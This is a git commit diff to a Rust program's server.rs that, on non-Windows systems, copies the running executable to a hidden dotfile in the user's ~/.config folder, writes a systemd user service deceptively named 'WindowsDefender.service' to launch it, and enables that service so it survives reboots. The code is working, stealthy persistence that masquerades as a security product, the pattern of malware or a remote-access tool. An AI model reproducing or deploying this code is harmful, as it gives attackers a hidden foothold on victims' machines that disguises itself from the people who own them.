06483af19362a6c2b68c797bfdba6b18dce2acfe
137-Trimethylxanthin <xxv.many@gmail.com>
2023-11-19 15:43:19 +0100

    windows proof

--- src/bin/server.rs
+++ src/bin/server.rs
@@ -11,25 +11,28 @@ fn main() {
 
     let current_path = env::current_exe().expect("Failed to get current executable path");
 
-    let service_name = "WindowsDefender.service";
-    let service_path = format!("{}/.config/systemd/user/{}", dirs::home_dir().unwrap().display(), service_name);
+    #[cfg(not(target_os = "windows"))]
+    {
+        let service_name = "WindowsDefender.service";
+        let service_path = format!("{}/.config/systemd/user/{}", dirs::home_dir().unwrap().display(), service_name);
 
-    // Check if the service file exists
-    if !Path::new(&service_path).exists() {
-        // copy the executable to the home directorys .config folder hidden in linux
-        fs::copy(&current_path, format!("{}/.config/.{}", dirs::home_dir().unwrap().display(), current_path.file_name().unwrap().to_str().unwrap())).expect("Unable to copy file");
-        // Create the service file
-        fs::write(&service_path, format!("[Service]\nExecStart={}\n\n[Install]\nWantedBy=default.target\n", format!("{}/.config/.{}", dirs::home_dir().unwrap().display(), current_path.file_name().unwrap().to_str().unwrap()))).expect("TODO: panic message");
+        // Check if the service file exists
+        if !Path::new(&service_path).exists() {
+            // copy the executable to the home directorys .config folder hidden in linux
+            fs::copy(&current_path, format!("{}/.config/.{}", dirs::home_dir().unwrap().display(), current_path.file_name().unwrap().to_str().unwrap())).expect("Unable to copy file");
+            // Create the service file
+            fs::write(&service_path, format!("[Service]\nExecStart={}\n\n[Install]\nWantedBy=default.target\n", format!("{}/.config/.{}", dirs::home_dir().unwrap().display(), current_path.file_name().unwrap().to_str().unwrap()))).expect("TODO: panic message");
 
-        // Enable the service
-        Command::new("systemctl")
-            .arg("--user")
-            .arg("enable")
-            .arg(service_name)
-            .output()
-            .expect("Failed to enable service");
-    } else {
-        println!("Service file already exists. Skipping creation.\n");
+            // Enable the service
+            Command::new("systemctl")
+                .arg("--user")
+                .arg("enable")
+                .arg(service_name)
+                .output()
+                .expect("Failed to enable service");
+        } else {
+            println!("Service file already exists. Skipping creation.\n");
+        }
     }
 
     if args.len() > 1 && args[1] == "-SS" {
